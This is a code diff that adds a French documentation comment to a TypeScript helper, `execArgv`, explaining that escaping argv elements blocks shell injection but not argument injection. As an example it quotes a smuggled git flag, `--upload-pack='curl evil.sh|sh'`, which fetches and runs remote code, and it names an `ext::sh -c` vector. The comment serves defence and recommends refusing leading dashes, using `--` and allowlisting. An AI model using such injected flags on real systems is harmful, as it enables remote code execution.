@@ -154,6 +154,20 @@ export function quoteArg(arg: string): string {
  * Variante sûre d'`exec` : la commande est un tableau, chaque élément est
  * échappé. À PRÉFÉRER systématiquement dès qu'une valeur ne vient pas d'une
  * constante du code.
+ *
+ * ATTENTION — ceci arrête l'injection SHELL, pas l'injection d'ARGUMENT.
+ * Une valeur commençant par `-` reste un token argv distinct, que le programme
+ * appelé lira comme un drapeau :
+ *
+ *     git clone --upload-pack='curl evil.sh|sh' ...
+ *
+ * exécute une commande arbitraire, et aucun guillemet n'y change rien puisque
+ * le shell n'est pas en cause. Chaque appelant doit donc, en plus :
+ *   - refuser les valeurs commençant par `-` ;
+ *   - poser `--` avant les positionnels quand la commande le supporte ;
+ *   - énumérer ce qui est permis plutôt que d'interdire au cas par cas, car
+ *     certains vecteurs ne ressemblent pas à des drapeaux (`ext::sh -c …`).
+ * Voir `assertNotFlag` dans @noddle/build-engine.
  */
 export function execArgv(
   client: Client,
